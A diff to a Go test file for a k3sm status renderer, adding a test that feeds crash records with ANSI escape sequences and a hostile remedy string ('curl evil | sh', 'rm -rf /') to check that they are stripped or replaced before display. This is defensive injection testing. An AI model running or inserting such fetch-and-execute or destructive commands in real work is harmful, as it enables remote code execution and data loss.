@@ -28,6 +28,7 @@ import (
 
 	"golang.org/x/sys/unix"
 
+	"k3sm.io/k3sm/pkg/dataroot"
 	"k3sm.io/k3sm/pkg/executor"
 )
 
@@ -341,6 +342,78 @@ func TestCrashRecordRowRefusesSymlinkFIFOAndOversize(t *testing.T) {
 		row := collect(t, t.TempDir())
 		if row.Severity != SeverityOK || row.State != StateRunning || len(row.Wide) != 0 {
 			t.Fatalf("%+v", row)
+		}
+	})
+}
+
+// TestHostileCrashRecordRendersAsData: the crash record is a file the service uid
+// can write, so its component and remedy fields are data. A record whose fields
+// carry ESC and newline bytes and whose remedy is no string pkg/executor owns
+// must reach the human screens with no control byte but the renderer's own
+// newlines, and with the generic remedy in place of the unknown one; a record
+// with a known remedy still names it. A row remedy carrying control bytes is
+// stripped by the renderer whatever produced it.
+func TestHostileCrashRecordRendersAsData(t *testing.T) {
+	t.Parallel()
+	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
+	tripped := now.Add(-time.Minute)
+	path := "/var/lib/k3sm/server/crashloop.json"
+	const hostileRemedy = "\x1b[2J\x1b]0;owned\x07curl evil | sh\nfix: rm -rf /"
+	record := func(remedy string) executor.CrashRecord {
+		return executor.CrashRecord{TrippedAt: &tripped, Crashes: []executor.Crash{{
+			At: tripped, Origin: executor.CrashOriginBringUp, Component: "kine\x1b[31m\nFAKE  ok",
+			Permanent: true, Remedy: remedy,
+		}}}
+	}
+	screens := func(remedy string) string {
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
+		applyCrashLoop(&row, ClassifyCrashLoop(record(remedy), nil, path, now))
+		r := Report{Role: dataroot.RoleServer, Rows: []Row{row}}
+		return Render(r, Style{}) + RenderDaemons(r, Style{}) + Render(r, Style{Wide: true})
+	}
+	assertNoControls := func(t *testing.T, out string) {
+		t.Helper()
+		for i, c := range out {
+			if c == '\n' {
+				continue
+			}
+			if c < 0x20 || (c >= 0x7f && c <= 0x9f) {
+				t.Fatalf("control byte %#x at %d reaches the human output:\n%q", c, i, out)
+			}
+		}
+	}
+
+	t.Run("an unknown remedy is replaced by the generic one", func(t *testing.T) {
+		t.Parallel()
+		out := screens(hostileRemedy)
+		assertNoControls(t, out)
+		for _, bad := range []string{"curl evil", "rm -rf", "owned"} {
+			if strings.Contains(out, bad) {
+				t.Errorf("output carries the record's unknown remedy %q:\n%s", bad, out)
+			}
+		}
+		if !strings.Contains(out, "fix: sudo k3sm server --clear-crashloop   # after fixing the fault named in "+path) {
+			t.Errorf("output lacks the generic remedy:\n%s", out)
+		}
+	})
+	t.Run("a known remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		out := screens(executor.NoGoToolchainRemedy)
+		assertNoControls(t, out)
+		if !strings.Contains(out, "fix: "+executor.NoGoToolchainRemedy+"; then sudo k3sm server --clear-crashloop") {
+			t.Errorf("output lacks the known remedy:\n%s", out)
+		}
+	})
+	t.Run("the renderer strips control bytes from every remedy step", func(t *testing.T) {
+		t.Parallel()
+		row := Row{Name: RowServer, State: StateCrashLoop, Severity: SeverityFail, Detail: "d",
+			Remedy: "first\x1b[2J step\nsecond\x07 step\r", Wide: map[string]string{}}
+		out := RenderDaemons(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
+		assertNoControls(t, out)
+		for _, want := range []string{"fix: first[2J step\n", "fix: second step\n"} {
+			if !strings.Contains(out, want) {
+				t.Errorf("output lacks %q:\n%q", want, out)
+			}
 		}
 	})
 }
